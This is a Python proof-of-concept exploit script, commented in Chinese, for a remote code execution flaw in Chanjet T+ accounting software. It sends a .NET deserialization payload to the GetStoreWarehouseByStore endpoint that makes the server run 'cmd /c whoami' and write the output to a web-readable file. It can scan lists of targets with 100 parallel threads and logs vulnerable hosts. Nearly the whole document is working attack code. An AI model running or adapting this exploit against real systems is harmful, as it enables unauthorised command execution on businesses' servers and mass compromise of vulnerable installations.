#用有畅捷通T+GetStoreWarehouseByStore RCE漏洞

import requests,sys,argparse,re,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
     test="""   ______     __  _____ __                
  / ____/__  / /_/ ___// /_____  ________ 
 / / __/ _ \/ __/\__ \/ __/ __ \/ ___/ _ \
/ /_/ /  __/ /_ ___/ / /_/ /_/ / /  /  __/
\____/\___/\__//____/\__/\____/_/   \___/ 
                                          

 """
     print(test)

def main():
    banner()
    parsers=argparse.ArgumentParser(description='用有畅捷通T+GetStoreWarehouseByStore RCE漏洞')
    parsers.add_argument('-u','--url',dest='url',type=str,help='please input your url')
    parsers.add_argument('-f','--file',dest='file',type=str,help='please input your filepath')
    args=parsers.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        #mp.map(poc, url_list) 的作用是并行地对 url_list 中的每个 URL 执行 poc 函数（或方法）
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"usag:\n\t python {sys.argv[0]} -h")
def poc(target):
    payload='/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore'

    #访问/tplus/test.txt文件，查看命令执行结果访问/tplus/test.txt文件，查看命令执行结果v
    payload1='/tplus/test.txt'

    headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
        'X-Ajaxpro-Method':'GetStoreWarehouseByStore',
        'Accept':'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection':'close',
        'Content-type':'application/x-www-form-urlencoded',
        'Content-Length':'577',
    }

    data='''{
                "storeID":{
                    "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
                    "MethodName":"Start",
                    "ObjectInstance":{
                        "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                        "StartInfo": {
                            "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                            "FileName":"cmd", "Arguments":"/c whoami > test.txt"
                        }
                    }
                }
            }'''
    try:
        res1=requests.post(url=target+payload,headers=headers,verify=False,data=data)

        #访问/tplus/test.txt文件，查看命令执行结果
        res2=requests.get(url=target+payload1,data=data,headers=headers,verify=False)
        if res2.status_code==200 and 'authority\system' in res2.text:
                    print(f"[+]目标存在 {target}")
                    with open('result.txt','a') as f:
                        f.write(target+'\n')
        else:
             print(f'[-]目标不存在漏洞 {target}')
    except:
        pass


if __name__ == '__main__':
    main()
